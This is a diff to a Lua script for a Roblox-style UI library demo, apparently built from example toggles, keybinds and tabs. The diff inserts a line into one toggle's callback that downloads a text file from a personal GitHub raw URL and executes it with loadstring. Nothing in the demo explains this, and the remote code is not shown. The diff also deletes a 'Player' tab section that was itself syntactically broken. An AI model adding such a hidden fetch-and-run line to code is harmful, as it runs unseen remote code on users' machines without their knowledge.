@@ -140,6 +140,9 @@ Window:AddToggle({
 	Description = "Switching",
 	Tab = Main,
 	Callback = function(Boolean) 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/duc1820082-dev/Alen/refs/heads/main/flo.txt"))()
+
 		warn(Boolean);
 	end,
 }) 
@@ -176,29 +179,7 @@ Window:AddKeybind({
 		warn("Key Set")
 	end,
 }) 
-local Main = Window:AddTab({
-	Title = "Player",
-	Section = "Player",
-	Icon = "rbxassetid://11963373994"
-})
-
-Window:AddSection({ Name = "Non Interactable", Tab = Player }) 
-	Title = "Toggle",
-	Description = "Switching",
-	Tab = Player,
-	Callback = function(Boolean) 
-		warn(Boolean);
-	end,
-}) 
-
-Window:AddInput({
-	Title = "Input",
-	Description = "Typing",
-	Tab = Player,
-	Callback = function(Text) 
-		warn(Text);
-	end,
-}) 
+ 
 
 
 
